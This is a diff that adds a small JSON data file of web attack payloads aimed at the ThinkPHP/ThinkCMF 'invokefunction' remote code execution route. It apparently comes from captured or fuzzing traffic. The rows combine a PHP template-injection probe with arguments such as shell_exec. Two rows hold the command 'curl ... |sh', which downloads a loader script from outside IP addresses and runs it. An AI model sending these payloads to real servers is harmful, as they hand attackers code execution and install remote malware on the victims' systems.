@@ -1,0 +1,43 @@
+{
+ "parameters": [
+  {
+   "name": "content",
+   "uuid": "53cde1a3-42ea-49f7-a41f-6a0d2bb8df75"
+  },
+  {
+   "name": "s",
+   "uuid": "d142d66f-faeb-4d84-bfb4-4e06b4c1a460"
+  },
+  {
+   "name": "vars_0_",
+   "uuid": "f8723822-54f1-47f3-a419-ffa9733010ac"
+  }
+ ],
+ "rows": [
+  {
+   "content": "<php>die(@md5(HelloThinkCMF))</php>",
+   "s": "/Index/\\think\\app/invokefunction",
+   "vars_0_": "shell_exec"
+  },
+  {
+   "content": "<php>die(@md5(HelloThinkCMF))</php>",
+   "s": "/Index/\\think\\app/invokefunction",
+   "vars_0_": "curl --user-agent curl_tp5 http://31.210.20.181/ldr.sh|sh"
+  },
+  {
+   "content": "<php>die(@md5(HelloThinkCMF))</php>",
+   "s": "/Index/\\think\\app/invokefunction",
+   "vars_0_": "curl --user-agent curl_tp5 http://194.40.243.98/ldr.sh|sh"
+  },
+  {
+   "content": "<php>die(@md5(HelloThinkCMF))</php>",
+   "s": "/Index/\\think\\app/invokefunction",
+   "vars_0_": "md5"
+  },
+  {
+   "content": "<php>die(@md5(HelloThinkCMF))</php>",
+   "s": "/Index/\\think\\app/invokefunction",
+   "vars_0_": "__HelloThinkPHP"
+  }
+ ]
+}
